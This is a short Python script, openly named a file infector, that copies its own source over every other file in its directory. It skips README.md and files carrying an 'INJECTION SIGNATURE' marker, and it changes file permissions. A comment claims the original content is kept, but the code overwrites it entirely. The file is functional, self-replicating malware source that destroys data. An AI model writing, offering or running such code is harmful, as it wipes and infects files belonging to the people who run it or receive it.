import logging
import os
import sys
from cached_property import cached_property


class FileInfector:
    

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @cached_property
    def malicious_code(self):
       
        # Get the name of this file.
        malicious_file = sys.argv[0]
        with open(malicious_file, 'r') as file:
            malicious_code = file.read()

        return malicious_code

    def infect_files_in_folder(self, path):
        
        num_infected_files = 0
        # List the directory to get all files.
        files = []
        for file in os.listdir(path):
            
            if file == 'README.md':
                continue

            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

       
        for file in files:
            logging.debug('Infecting file: {}'.format(file))

            # Read the content of the original file.
            with open(file, 'r') as infected_file:
                file_content = infected_file.read()
        
            if "INJECTION SIGNATURE" in file_content:
                continue

            # Ensure that the injected file is executable.
            os.chmod(file, 777)

            # Write the original and malicous part into the file.
            with open(file, 'w') as infected_file:
                infected_file.write(self.malicious_code)

            num_infected_files += 1

        return num_infected_files


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)


    code_injector = FileInfector('SimpleFileInfector')

   
    path = os.path.dirname(os.path.abspath(__file__))
    number_infected_files = code_injector.infect_files_in_folder(path)

    logging.info('Number of infected files: {}'.format(number_infected_files))
